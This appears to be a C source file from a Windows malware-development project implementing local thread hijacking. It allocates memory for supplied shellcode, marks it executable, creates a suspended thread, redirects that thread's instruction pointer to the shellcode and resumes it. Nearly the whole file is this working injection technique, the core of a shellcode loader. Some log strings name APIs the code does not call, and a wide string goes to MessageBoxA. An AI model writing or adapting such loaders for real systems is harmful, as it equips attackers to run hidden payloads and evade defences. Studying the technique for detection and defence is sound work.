#include "box.h"

VOID localfunc(VOID)
{
	MessageBoxA(NULL, L"Local Thread Hijacking", "Hijacked!", MB_OK);
	return;
}

BOOL InjectThread
(
	OUT HANDLE* hThread,
	IN PBYTE sShellcode,
	IN SIZE_T sSizeofShellcode,
	OUT PVOID* pAddress
)

{

	BOOL	State			= TRUE;
	SIZE_T	sBytesWritten	= 0;
	PVOID	rBuffer			= NULL;
	DWORD	dwOldProt		= 0;

	if (!sShellcode || !sSizeofShellcode)
	{
		WARN("Parameters not Supplied");
		State = FALSE; goto CLEANUP;
	}

	rBuffer = VirtualAlloc(NULL, sSizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (rBuffer == NULL)
	{
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto CLEANUP;
	}

	INFO("Allocated %zu bytes to Buffer via VirtualAllocEx!", sSizeofShellcode);

	memcpy(rBuffer, sShellcode, sSizeofShellcode);

	INFO("Successfully Wrote Allocated Bytes to Memory via WriteProcessMemory!");

	if (!VirtualProtect(rBuffer, sSizeofShellcode, PAGE_EXECUTE_READ, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtectEx");
		State = FALSE; goto CLEANUP;
	}

	INFO("Changed Allocation Rights | Page_ReadWrite --> Page_Execute_Read");

	INFO("creating a suspended thread in the local process...");

	*hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&localfunc, NULL, CREATE_SUSPENDED, NULL);
	if (*hThread == NULL)
	{
		PRINT_ERROR("CreateThread");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] created the thread (%ld)! beginning the hijack...", *hThread, GetThreadId(*hThread));


	*pAddress = rBuffer;

CLEANUP:


	return State;

}

BOOL HijackThread
(
	IN HANDLE hThread,
	IN PVOID pRemoteAddress
)
{

	BOOL State = TRUE;

	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;

	if (!hThread || !pRemoteAddress)
	{
		PRINT_ERROR("hThread, pRemoteAddress");
		State = FALSE; goto CLEANUP;
	}

	if (!GetThreadContext(hThread, &ThreadCtx))
	{
		PRINT_ERROR("GetThreadContext");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current Thread Context", ThreadCtx);

	printf(
		"_______________\n"
		"|				\n"
		"| [RAX]: [0X%P]\n"
		"| [RBX]: [0X%P]\n"
		"| [RCX]: [0X%P]\n"
		"| [RDX]: [0X%P]\n"
		"| [RSP]: [0X%P]\n"
		"| [RSI]: [0X%P]\n"
		"| [RDI]: [0X%P]\n"
		"| [RIP]: [0X%P]\n"
		"|				\n"
		"_______________\n",
		(PVOID*)ThreadCtx.Rax, (PVOID*)ThreadCtx.Rbx, (PVOID*)ThreadCtx.Rcx, (PVOID*)ThreadCtx.Rdx,
		(PVOID*)ThreadCtx.Rsp, (PVOID*)ThreadCtx.Rsi, (PVOID*)ThreadCtx.Rdi, (PVOID*)ThreadCtx.Rip
	);

	INFO("[RIP] --> [0x%p] Updating Instruction Pointer...", (PVOID*)ThreadCtx.Rip);

	ThreadCtx.Rip = (DWORD64)pRemoteAddress;

	if (!SetThreadContext(hThread, &ThreadCtx))
	{
		PRINT_ERROR("SetThreadContext");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[RIP] --> [0x%p] Instruction Updated... Pointing to out Allocated Buffer --> [0x%p]", (PVOID*)ThreadCtx.Rip, pRemoteAddress);

	if (!ResumeThread(hThread))
	{
		PRINT_ERROR("ResumeThread");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] waiting for thread to finish execution...", hThread);

	WaitForSingleObject(hThread, INFINITE);

	INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);

CLEANUP:

	if (pRemoteAddress)
		VirtualFree(pRemoteAddress, 0, MEM_RELEASE);

	if (hThread)
	{
		INFO("[0x%p] Closing hThread...", hThread);
		CloseHandle(hThread);
	}

	return State;
}